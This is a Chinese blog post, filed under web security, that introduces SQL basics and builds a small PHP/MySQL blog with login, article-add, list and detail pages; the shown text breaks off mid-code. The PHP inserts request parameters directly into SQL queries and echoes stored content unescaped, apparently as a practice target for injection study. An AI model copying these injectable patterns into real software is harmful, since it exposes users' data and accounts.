<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>SQL基础 | Chronos</title><meta name="author" content="Chronos"><meta name="copyright" content="Chronos"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="NO.1SQL基础0x1 sql的基本语法1 sql语言的作用sql是一门语言，专门用来操作数据库中的数据。通过SQL语句，我们可以快速地实现数据插入、删除、修改、查询，合起来就是我们常说的增删改查，操作为：  Create Delete Update Read  简写为CURD，通过sql语句，我们可以和数据库进行交互，实现CURD操作 2 数据库前面我们知道，sql是操作数据库的，那数据库是什">
<meta property="og:type" content="article">
<meta property="og:title" content="SQL基础">
<meta property="og:url" content="https://chronos.mc9g.cn/web%E5%AE%89%E5%85%A8/SQL/blog(SQL)/index.html">
<meta property="og:site_name" content="Chronos">
<meta property="og:description" content="NO.1SQL基础0x1 sql的基本语法1 sql语言的作用sql是一门语言，专门用来操作数据库中的数据。通过SQL语句，我们可以快速地实现数据插入、删除、修改、查询，合起来就是我们常说的增删改查，操作为：  Create Delete Update Read  简写为CURD，通过sql语句，我们可以和数据库进行交互，实现CURD操作 2 数据库前面我们知道，sql是操作数据库的，那数据库是什">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://zcystar-1313738303.cos.ap-beijing.myqcloud.com/9AE5EADB01D68AF6519D1AE140FE1372.jpg">
<meta property="article:published_time" content="2022-11-11T11:06:10.000Z">
<meta property="article:modified_time" content="2022-11-11T11:19:22.755Z">
<meta property="article:author" content="Chronos">
<meta property="article:tag" content="SQL">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://zcystar-1313738303.cos.ap-beijing.myqcloud.com/9AE5EADB01D68AF6519D1AE140FE1372.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://chronos.mc9g.cn/web%E5%AE%89%E5%85%A8/SQL/blog(SQL)/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'SQL基础',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-11-11 19:19:22'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://zcystar-1313738303.cos.ap-beijing.myqcloud.com/a.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://zcystar-1313738303.cos.ap-beijing.myqcloud.com/9AE5EADB01D68AF6519D1AE140FE1372.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Chronos</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">SQL基础</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-11-11T11:06:10.000Z" title="发表于 2022-11-11 19:06:10">2022-11-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-11-11T11:19:22.755Z" title="更新于 2022-11-11 19:19:22">2022-11-11</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web%E5%AE%89%E5%85%A8/SQL/">SQL</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="SQL基础"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="NO-1SQL基础"><a href="#NO-1SQL基础" class="headerlink" title="NO.1SQL基础"></a>NO.1SQL基础</h1><h2 id="0x1-sql的基本语法"><a href="#0x1-sql的基本语法" class="headerlink" title="0x1 sql的基本语法"></a>0x1 sql的基本语法</h2><h3 id="1-sql语言的作用"><a href="#1-sql语言的作用" class="headerlink" title="1 sql语言的作用"></a>1 sql语言的作用</h3><p>sql是一门语言，专门用来操作数据库中的数据。通过SQL语句，我们可以快速地实现数据插入、删除、修改、查询，合起来就是我们常说的<strong>增删改查</strong>，操作为：</p>
<ul>
<li>Create</li>
<li>Delete</li>
<li>Update</li>
<li>Read</li>
</ul>
<p>简写为CURD，通过sql语句，我们可以和数据库进行交互，实现CURD操作</p>
<h3 id="2-数据库"><a href="#2-数据库" class="headerlink" title="2 数据库"></a>2 数据库</h3><p>前面我们知道，sql是操作数据库的，那数据库是什么？</p>
<p>数据库是一种软件，他负责将数据以一定的格式保存在磁盘中，方便人们进行数据操作</p>
<p>数据库一般可以分为</p>
<ul>
<li>关系型数据库</li>
<li>非关系型数据库</li>
</ul>
<h4 id="关系型数据库"><a href="#关系型数据库" class="headerlink" title="关系型数据库"></a>关系型数据库</h4><p>关系型数据库，是指采用了关系模型来组织数据的数据库。其以行和列的形式储存数据，以便于用户理解，关系型数据库这一系列的行和列被称为表，一组表组成了数据库，用户通过查询来检索数据库中的数据，而查询是一个于限定数据库中某些区域的执行代码。关系模型可以简单理解为二维表格模型，而一个关系型数据库就是其二维表及其之间的关系组成的数据组织。常见的软件有</p>
<ul>
<li>Oracle适合超大型数据</li>
<li>Mysql免费版是MariaDB</li>
<li>SqlServer</li>
<li>Access后缀一般为mdb，适合微型数据</li>
</ul>
<h4 id="非关系型数据库"><a href="#非关系型数据库" class="headerlink" title="非关系型数据库"></a>非关系型数据库</h4><p>也叫NoSQL，泛指非关系型的数据库。随着互联网Web2.0网站的兴起，传统的关系数据库在处理Web2.0网站，特别是超大规模和高并发的SNS类型的web2.0纯动态网站已经显得力不从心，出现了很多难以克服的问题。而非关系型的数据库则由于其本身的特点，得到了非常迅速的发展。NoSQL数据库的产生就是为了解决大规模数据集合多重数据种类带来的挑战，特别是大数据应用难题。</p>
<p>典型代表有：</p>
<ul>
<li>Membase</li>
<li>MongoDB</li>
</ul>
<h2 id="0x2-php操作数据库"><a href="#0x2-php操作数据库" class="headerlink" title="0x2 php操作数据库"></a>0x2 php操作数据库</h2><h3 id="1-php链接mysql数据库"><a href="#1-php链接mysql数据库" class="headerlink" title="1 php链接mysql数据库"></a>1 php链接mysql数据库</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$host</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="string">&quot;text&quot;</span>;</span><br><span class="line"><span class="variable">$port</span> = <span class="string">&quot;3306&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$host</span>,<span class="variable">$username</span>,<span class="variable">$password</span>,<span class="variable">$db</span>,<span class="variable">$port</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$conn</span>-&gt;connect_error)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;数据库连接异常&quot;</span>.<span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="2-使用php建立登陆界面"><a href="#2-使用php建立登陆界面" class="headerlink" title="2 使用php建立登陆界面"></a>2 使用php建立登陆界面</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Charmersix_blog系统登录&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">      &lt;center&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">          &lt;h1&gt;Charmersix_blog系统登录&lt;/h1&gt;</span><br><span class="line">        &lt;hr&gt;</span><br><span class="line">        &lt;form action=&quot;login.php&quot; enctype=&quot;application/x-www-form-urlencoded&quot; method=&quot;post&quot;&gt;</span><br><span class="line">          账户:&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">          密码:&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">          &lt;br&gt;</span><br><span class="line">          &lt;input type=&quot;submit&quot; value=&quot;登录&quot;&gt;&lt;br&gt;&lt;br&gt;         </span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">      &lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>



<h3 id="3-建立登陆验证功能"><a href="#3-建立登陆验证功能" class="headerlink" title="3 建立登陆验证功能"></a>3 建立登陆验证功能</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;conn.php&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username from user where username = &#x27;<span class="subst">$username</span>&#x27; and password = &#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>); <span class="comment">//sql语句传进去,和数据库交互</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_array</span>(MYSQLI_BOTH))&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将交互结果反馈出来</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;登录成功,欢迎&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;LOGIN&#x27;</span>]=<span class="literal">true</span>;</span><br><span class="line">    <span class="variable">$a</span>=<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">    &lt;a href=&quot;index.html&quot; style=&quot;color: tomato&quot;&gt;首页&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &lt;a href=&quot;page_list.php&quot; style=&quot;color: tomato&quot;&gt;文章列表&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &lt;a href=&quot;page_add.php&quot; style=&quot;color: tomato&quot;&gt;新增内容&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &lt;a href=&quot;page_logout.php&quot; style=&quot;color: tomato&quot;&gt;退出登录&lt;/a&gt;</span></span><br><span class="line"><span class="string">EOF</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;登录失败&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br></pre></td></tr></table></figure>



<h3 id="4-增加文章录入功能"><a href="#4-增加文章录入功能" class="headerlink" title="4 增加文章录入功能"></a>4 增加文章录入功能</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;conn.php&quot;;</span><br><span class="line">include &quot;check.php&quot;;</span><br><span class="line"></span><br><span class="line">$title = $_POST[&#x27;title&#x27;];</span><br><span class="line">$content = $_POST[&#x27;content&#x27;];</span><br><span class="line">if(isset($title)&amp;&amp;isset($content))&#123;</span><br><span class="line">    //以免插入空内容</span><br><span class="line">    $sql = &quot;insert into page (title,content) values(&#x27;$title&#x27;,&#x27;$content&#x27;)&quot;;</span><br><span class="line">    $result = $conn-&gt;query($sql);</span><br><span class="line">    if($result)&#123;</span><br><span class="line">        echo &quot;插入成功&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &quot;插入失败&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> $conn-&gt;close();</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Chronos文章录入&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">      &lt;center&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">          &lt;h1&gt;Chronos文章录入&lt;/h1&gt;</span><br><span class="line">        &lt;hr&gt;</span><br><span class="line">        &lt;form action=&quot;page_add.php&quot; enctype=&quot;application/x-www-form-urlencoded&quot; method=&quot;post&quot;&gt;</span><br><span class="line">          标题:&lt;input type=&quot;text&quot; name=&quot;title&quot;&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">          内容:&lt;input type=&quot;text&quot; name=&quot;content&quot;&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">          &lt;br&gt;</span><br><span class="line">          &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;br&gt;&lt;br&gt;         </span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">      &lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>



<h3 id="5-显示文章列表"><a href="#5-显示文章列表" class="headerlink" title="5 显示文章列表"></a>5 显示文章列表</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;conn.php&quot;;</span><br><span class="line">include &quot;check.php&quot;;</span><br><span class="line"></span><br><span class="line">$sql = &quot;select id,title,content from page&quot;;</span><br><span class="line">$result = $conn-&gt;query($sql);</span><br><span class="line">if ($result)&#123;</span><br><span class="line">    $list = $result-&gt;fetch_all(MYSQLI_BOTH);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Chronos内容列表&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">      &lt;center&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">         &lt;h1 style=&quot;color: #ffb8e5&quot;&gt;Chronos内容列表&lt;/h1&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;ul&gt;</span><br><span class="line">        &lt;?php</span><br><span class="line">        foreach ($list as $p)&#123;</span><br><span class="line">        ?&gt;</span><br><span class="line">            &lt;li&gt;</span><br><span class="line">                &lt;a href=&quot;page_detail.php?id=&lt;?=$p[&#x27;id&#x27;]; ?&gt;&quot;&gt;</span><br><span class="line">                    &lt;?=$p[&#x27;title&#x27;]; ?&gt;</span><br><span class="line">                &lt;/a&gt;</span><br><span class="line">                &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;</span><br><span class="line">                &lt;a href=&quot;page_detail.php?id=&lt;?=$p[&#x27;id&#x27;]; ?&gt;&quot;&gt;查看&lt;/a&gt;</span><br><span class="line">                &lt;a href=&quot;page_edit.php?id=&lt;?=$p[&#x27;id&#x27;]; ?&gt;&quot;&gt; | 修改&lt;/a&gt;</span><br><span class="line">                &lt;a href=&quot;page_delete.php?id=&lt;?=$p[&#x27;id&#x27;]; ?&gt;&quot;&gt; | 删除&lt;/a&gt;</span><br><span class="line">            &lt;/li&gt;</span><br><span class="line">        &lt;?php</span><br><span class="line">        &#125;</span><br><span class="line">        ?&gt;</span><br><span class="line">     &lt;/ul&gt;</span><br><span class="line">      &lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$conn-&gt;close();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<h3 id="6-显示文章详情"><a href="#6-显示文章详情" class="headerlink" title="6 显示文章详情"></a>6 显示文章详情</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;conn.php&quot;;</span><br><span class="line">include &quot;check.php&quot;;</span><br><span class="line"></span><br><span class="line">$id = $_GET[&#x27;id&#x27;]?$_GET[&#x27;id&#x27;]:1;</span><br><span class="line">$sql = &quot;select id,title,content from page where id = $id&quot;;</span><br><span class="line">$result = $conn-&gt;query($sql);</span><br><span class="line">if($result)&#123;</span><br><span class="line">    $page = $result-&gt;fetch_array(MYSQLI_BOTH);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;&lt;?=$page[&#x27;title&#x27;];?&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">    &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">    &lt;h1 style=&quot;color: #ffb8e5&quot;&gt;&lt;?=$page[&#x27;title&#x27;];?&gt;&lt;/h1&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;p style=&quot;color: #ffb8e5&quot;&gt;</span><br><span class="line">        &lt;?=$page[&#x27;content&#x27;];?&gt;</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>



<h3 id="7-增加文章编辑功能"><a href="#7-增加文章编辑功能" class="headerlink" title="7 增加文章编辑功能"></a>7 增加文章编辑功能</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td 